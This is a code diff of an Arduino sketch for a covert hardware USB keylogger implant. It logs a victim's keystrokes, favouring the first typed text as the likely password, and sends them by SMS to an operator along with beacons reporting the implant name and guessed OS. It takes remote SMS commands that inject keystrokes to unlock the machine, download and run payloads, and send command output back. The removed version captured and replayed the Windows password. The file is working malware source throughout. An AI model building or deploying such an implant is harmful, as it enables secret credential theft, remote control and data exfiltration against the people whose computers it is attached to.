@@ -1,129 +1,242 @@
-#include <SoftwareSerial.h>            
-#include <Keyboard.h>                  
-#include "C_USBhost.h"                
+/* NOTE: Make sure to edit SoftwareSerial.h to change 
+ *  #define _SS_MAX_RX_BUFF 64 // RX buffer size
+ *  to
+ *  #define _SS_MAX_RX_BUFF 256 // RX buffer size
+ *
+ * You need to set your info in globals.h
+*/
+#include <SoftwareSerial.h>
+#include <Keyboard.h>
+#include "C_USBhost.h"
+#include "Payloads.h"
+#include "utils.h"
+#include "globals.h"
+#include "FingerprintUSBHost.h"
 
-C_USBhost USBhost = C_USBhost(Serial1, /*debug_state*/false);            
+#ifdef DEBUG
+C_USBhost USBhost = C_USBhost(Serial1, 1);
+#else
+C_USBhost USBhost = C_USBhost(Serial1, 0);
+#endif
 SoftwareSerial SMSSERIAL(8, 9);
 
-#define CHAR_LIMIT 140                                
-#define BAUD_RATE_SIM800L 57700                    
-#define BAUD_RATE_USB_HOST_BOARD 115200             
-#define BAUD_RATE_SERIAL 115200                    
+unsigned long previousMillis = 0;
+unsigned long previousMillisBeacon = 0;
+unsigned long previousFailSMSMillis = 0;
+String os;
+bool firstExecution = true;
 
-char TextSms[CHAR_LIMIT+2];                  
-int char_count;                              
-char backupTextSms[CHAR_LIMIT+2];
-unsigned long previousMillis=0;
-int interval=3000;
-int interval_payload=15000;
-String SMS = "";
-int passcached=0;
-char password[127];
-char empty;
-int password_char_count;
-byte b;
-String substr = "";
-int location;
 
-//You need to change the mobile phone number in THREE places!
+#ifdef DEBUG
+  unsigned long interval = 3000;
+#else
+  unsigned long interval = 60000;
+#endif
+byte captured_key;
+bool pendingSMS = false;
+String buffer_keystrokes = "";
+unsigned int pendingLength = 0;
 
-void setup() {
-  delay(1000);                                              
-  Serial.begin(BAUD_RATE_SERIAL);                                                   
+void setup(){
+  delay(3000);                                              
+  Serial.begin(BAUD_RATE_SERIAL);
+
+  Keyboard.begin();
+  
+  // Try to guess the OS
+  FingerprintUSBHost.guessHostOS(os);
+  
+#ifndef DEBUGWITHOUTSIM
   SMSSERIAL.begin(BAUD_RATE_SIM800L);
   USBhost.Begin(BAUD_RATE_USB_HOST_BOARD);                   
-  Keyboard.begin();
-  Keyboard.press(KEY_RIGHT_GUI);
-  Keyboard.press('l');
-  Keyboard.releaseAll();
-                                            
+  SMSSERIAL.println(F("AT"));
+  readResponse();
+
+  // This is needed to prevent the keylogger to hang out when sending a SMS since the default timeout is 1 sec
+  Serial.setTimeout(100);
+  SMSSERIAL.setTimeout(100);
+
+  // Selects SMS message format as text. Default format is Protocol Data Unit (PDU)
+  SMSSERIAL.println(F("AT+CMGF=1"));
+  readResponse();
+
+#ifdef DEBUG
+  collectDebugInfo();
+#endif
+
+#endif //DEBUGWITHOUTSIM                                        
 }
 
-void loop() {  
+void loop(){
   unsigned long currentMillis = millis();
-  b = USBhost.GetKey();        
-//Get windows passmethod
-  if( passcached == 0 && char_count > 0){
-        while(b != 10){
-         b = USBhost.GetKey();
-         if(b){
-          if(b == 8){
-            if(password_char_count > 0){
-              password_char_count--;
-              password[password_char_count] = empty;
-              }
-            }
-          else{
-           password[password_char_count++] = (char)b;   
-            }
-          previousMillis = currentMillis;
-          }
-        }
-      passcached++;
-      SMSSERIAL.write("AT+CMGF=1\r\n");
-      delay(2);
-      SMSSERIAL.write("AT+CMGS=\"+31600000000\"\r\n"); //phonenumber with land code
-      delay(2);
-      SMSSERIAL.write(password); 
-      SMSSERIAL.write((char)26);
-    }
-  
+  captured_key = USBhost.GetKey();    
+
+  // Send a beacon so we know that the implant is up
+  // ToDo: this can infere with payloads execution. Use only when user is not typing
+  if (firstExecution || !pendingSMS && (unsigned long)((currentMillis - previousMillisBeacon)/ 60000) >= BEACON_TIME){
+      firstExecution = false;
+      String msg = F("Beacon - ");
+      msg += IMPLANT_NAME;
+      msg += " (";
+      msg += os; // add possible os in the beacon
+      msg += ")";
+#ifdef DEBUG
+      Serial.print(F("Sending beacon"));
+      Serial.println(msg);
+#endif
+      sendSMSMessage(msg);
+      previousMillisBeacon = currentMillis;
+  }
+
   //Normalkey capture
-  if(b){
-    if(b == 8){
-      if(char_count > 0){
-        char_count--;
-        TextSms[char_count] = empty;
+  if(captured_key){
+    if(captured_key == 8){ // Backspace
+      if(buffer_keystrokes.length() > 0){
+        buffer_keystrokes = buffer_keystrokes.substring(0, buffer_keystrokes.length() - 1);
       }
     }
-    else {
-      TextSms[char_count++] = (char)b;
-      }
+    else if(captured_key >= 32){ // Ignore not printable characters
+      // Arduino doesn't have a lot of memory, so we need to define a max size for the buffer
+      // if more characters arrive after the buffer if full it discards them (we prioritize older 
+      /// text because prob the first thing typed is the password) 
+      if (buffer_keystrokes.length() <  MAX_BUFFER_SIZE)
+        buffer_keystrokes += (char)captured_key;
+    }
     previousMillis = currentMillis;  
   }
-  //SMS send
-  if (char_count == CHAR_LIMIT - 1 || (unsigned long)(currentMillis - previousMillis) >= interval && char_count > 5) {
-      SMSSERIAL.write("AT+CMGF=1\r\n");
-      delay(2);
-      SMSSERIAL.write("AT+CMGS=\"+31600000000\"\r\n"); //phonenumber with land code
-      delay(2);
-      SMSSERIAL.write(TextSms); 
-      SMSSERIAL.write((char)26);
-      memset(TextSms, 0, sizeof(TextSms));
-      char_count = 0; 
-    } 
 
-   //Payload Method Make sure keyword are unique enough that subject in question wont enter them on their keyboard.
-      if (SMSSERIAL.available() && (unsigned long)(currentMillis - previousMillis) >= interval_payload) {  
-      SMS = SMSSERIAL.readString();    
-      if(SMS.indexOf("Execute:Payload") > -1){
-      Serial.print(password); // Payload
-      Keyboard.press(KEY_HOME);
-      Keyboard.releaseAll();
-      delay(500);
-      Keyboard.print(password);
-      Keyboard.press('\n');
-      Keyboard.releaseAll();
-     }
-     if(SMS.indexOf("Password:Reveal") > -1){ //Keyword
-      SMSSERIAL.write("AT+CMGF=1\r\n");
-      delay(2);
-      SMSSERIAL.write("AT+CMGS=\"+31600000000\"\r\n"); //phonenumber with land code
-      delay(2);
-      SMSSERIAL.write(password);
-      SMSSERIAL.write((char)26);
-      char_count = 0;
-     }
-     if(SMS.indexOf("Manual:") > -1){       
-         location = SMS.indexOf("Manual:");
-         substr = SMS.substring(location + 7);
-         Keyboard.print(substr);
-      }
-    //Manual Password overwrite incase first entry was wrong.
-     if(SMS.indexOf("ManualPass:") > -1){    
-         location = SMS.indexOf("ManualPass:");   
-         substr = SMS.substring(location + 11);
-         substr.toCharArray(password, 127);
+  //SMS send
+  if (buffer_keystrokes.length() >= SMS_CHAR_LIMIT - 1 || (unsigned long)(currentMillis - previousMillis) >= interval && buffer_keystrokes.length() > 5){
+    if(currentMillis - previousFailSMSMillis >  10000){ // delay 10 seconds between trying sending SMS if it failed
+      if (!pendingSMS){
+        // The buffer could hold a lot of characters from previous SMS that couldn't be sent
+        String bufferToSend = "";
+        if (buffer_keystrokes.length() < SMS_CHAR_LIMIT - 1){
+          bufferToSend = buffer_keystrokes;
+        }
+        else{
+          bufferToSend = buffer_keystrokes.substring(0, SMS_CHAR_LIMIT - 1);
+        }
+  #ifdef DEBUG
+        Serial.print(F("Trying to send message with content: "));
+        Serial.println(bufferToSend);
+  #endif
+        
+        sendSMSMessage(bufferToSend);
+        pendingSMS = true;
+        pendingLength = bufferToSend.length();
       } 
-  } 
+      else{
+  #ifdef DEBUG
+        Serial.println(F("There is a SMS pending to be sent..."));
+  #endif
+      }
+    }
+  }
+
+  // If there is a pending SMS we check if it was sent, if so we remove the characters sent
+  if (pendingSMS){
+    if (SMSSERIAL.available()){
+      String res = SMSSERIAL.readString();
+#ifdef DEBUG
+      Serial.print(F("Message read from SMSSERIAL: "));
+      Serial.println(res);
+#endif
+      if (res.indexOf(F("CMGS: ")) > 0){
+#ifdef DEBUG
+        Serial.println(F("SMS message succesfully sent"));
+#endif
+         
+        SMSSerialFlush(); // just is case there is something else in the serial
+        
+        // We removed from the buffer the characters that were sent
+        buffer_keystrokes = buffer_keystrokes.substring(pendingLength);
+      }
+      else if (res.indexOf(F("ERROR: "))){ // The SMS couldn't be sent, we need to retry        
+#ifdef DEBUG
+        Serial.print(F("ERROR trying to send message with content: "));
+        Serial.println(buffer_keystrokes.substring(0, pendingLength));
+#endif
+        previousFailSMSMillis = currentMillis;
+      }
+      pendingSMS = false;
+    }
+  }
+
+#ifdef DEBUGWITHOUTSIM
+  if (true) {
+#else
+  //Payload Method Make sure keyword are unique enough that subject in question wont enter them on their keyboard.
+  if (!pendingSMS && SMSSERIAL.available()){
+#endif
+
+#ifdef DEBUG
+    Serial.println(F("new SMS"));
+#endif
+
+    String SMS = SMSSERIAL.readString();      
+#ifdef DEBUGWITHOUTSIM
+    //We wait a little bit so the OS has time to identify the keyboard
+    delay(30000);
+    // To simulate a real SMS:
+    SMS = F("+CMT: blablabla\r\n");
+    SMS += DEBUGWITHOUTSIM_PAYLOAD;
+#endif
+
+    if(SMS.indexOf(F("+CMT: ")) > -1){ // We got a command
+      String SMS_text;
+      // Code to remove last new line if exists
+      if(SMS.charAt(SMS.length())== '\n' &&  SMS.charAt(SMS.length()-1)== '\r'){
+        SMS.remove(SMS.length()-1, SMS.length());
+      }
+      int new_line_pos = SMS.indexOf("\r\n", 2);
+      SMS_text = SMS.substring(new_line_pos +2); // +2 is bc \r\n
+#ifdef DEBUG
+      Serial.println(F("Received SMS with content:"));
+      Serial.println(SMS_text);
+#endif
+      String payload = getValue(SMS_text, SEPARATOR, 0);
+  
+#ifdef DEBUG
+      if(payload.length() > 0){
+        Serial.print(F("Got payload: "));
+        Serial.println(payload);
+      }
+#endif
+      
+      if (payload == F("UnlockDownload")){
+        unlockDownload(SMS_text);
+      }
+      else if(payload == F("UnlockRunAndExfil")){
+        unlockRunAndExfil(SMS_text);
+      }
+      else if(payload == F("Manual")){
+        manualPayload(SMS_text);
+      }
+      else{
+#ifdef DEBUG
+        Serial.print(F("Unknown payload "));
+        Serial.println(payload); 
+#endif
+        sendSMSMessage("Unknown payload '" + payload + "'\nFull message: " + SMS_text);
+      }
+#ifdef DEBUGWITHOUTSIM
+      // After execute a fake payload it does a sleep
+      delay(30000);
+#endif
+    }
+    else {
+#ifdef DEBUG
+      Serial.print(F("Receive something that is not an SMS: "));
+      Serial.println(SMS);
+#endif
+    }
+  }
+
+  // If there is anything to read from the serial port we forward it via SMSs 
+  // This is used to exfil the result of commands
+  if (Serial.available()) {
+    String output = Serial.readString();
+    sendSMSMessage("Ex:" + output);
+  }
 }
